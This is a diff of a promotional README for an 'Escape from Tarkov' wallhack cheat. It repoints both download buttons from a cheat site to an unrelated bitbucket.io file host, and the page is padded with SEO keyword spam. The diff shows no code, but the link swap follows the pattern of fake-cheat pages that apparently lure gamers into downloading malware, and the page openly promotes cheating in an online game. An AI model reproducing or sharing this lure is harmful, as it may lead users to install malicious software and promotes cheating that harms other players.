@@ -2,7 +2,7 @@
 
 **Tired of getting ambushed? Hate peeking corners blind? A Tarkov wallhack gives you full vision of PMCs, loot, AI, and traps before you even hear a footstep. No more guesswork — just tactical dominance.**
 
-[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://fileoffload18.bitbucket.io)
 ---
 
 ## 👁️ What is a Wallhack in Escape from Tarkov?
@@ -11,7 +11,7 @@ A **wallhack** is a cheat that overlays real-time visual info on top of the game
 
 Perfect for solos, rat-hunters, PvP squads, or loot-focused runs where awareness = survival.
 
-[![Download Wallhack](https://repository-images.githubusercontent.com/713163211/bb90c382-1c7e-4e6f-8f34-e4f71d660815)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Wallhack](https://repository-images.githubusercontent.com/713163211/bb90c382-1c7e-4e6f-8f34-e4f71d660815)](https://fileoffload18.bitbucket.io)
 ---
 
 ## 🔥 Best Wallhack Features in Tarkov
@@ -70,3 +70,4 @@ Wallhacks completely **change how you engage**, making every raid tactical and e
 tarkov wallhack, escape from tarkov esp, loot esp tarkov, player glow cheat eft, no grass no fog tarkov, tarkov radar overlay, eft wall cheat pc, tarkov skeleton esp, cheat to see through walls tarkov, tarkov hidden stash cheat
 
 ---
+
